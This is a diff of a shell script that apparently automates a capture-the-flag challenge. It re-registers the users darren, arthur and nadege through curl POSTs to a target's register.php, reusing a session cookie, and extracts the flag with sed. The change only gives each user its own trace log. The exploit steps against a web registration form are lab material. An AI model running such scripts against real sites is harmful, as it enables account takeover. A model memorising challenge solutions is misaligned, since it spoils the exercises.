@@ -19,7 +19,7 @@ echo "--> Session initiated : $PHPSESSID"
 
 # Registering darren a second time
 echo "2 - REGISTERING DARREN"
-curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace.log -H "Content-Type: multipart/form-data; boundary=-----------------------------boundary" --data-binary @${scriptpath}/7-data/darren.txt
+curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace-darren.log -H "Content-Type: multipart/form-data; boundary=-----------------------------boundary" --data-binary @${scriptpath}/7-data/darren.txt
 
 # Logging as adrren
 echo "5 - ANALYZING DARREN"
@@ -28,7 +28,7 @@ echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-
 
 # Registering arthur a second time
 echo "4 - REGISTERING ARTHUR"
-curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace.log -H "Content-Type: multipart/form-data; boundary=-----------------------------boundary" --data-binary @${scriptpath}/7-data/arthur.txt
+curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace-arthur.log -H "Content-Type: multipart/form-data; boundary=-----------------------------boundary" --data-binary @${scriptpath}/7-data/arthur.txt
 
 # Logging as arthur
 echo "5 - ANALYZING ARTHUR"
@@ -37,4 +37,4 @@ echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-
 
 # Registering nadege a second time
 echo "4 - REGISTERING ARTHUR"
-curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace.log -H "Content-Type: multipart/form-data; boundary=-----------------------------boundary" --data-binary @${scriptpath}/7-data/nadege.txt
+curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace-nadege.log -H "Content-Type: multipart/form-data; boundary=-----------------------------boundary" --data-binary @${scriptpath}/7-data/nadege.txt
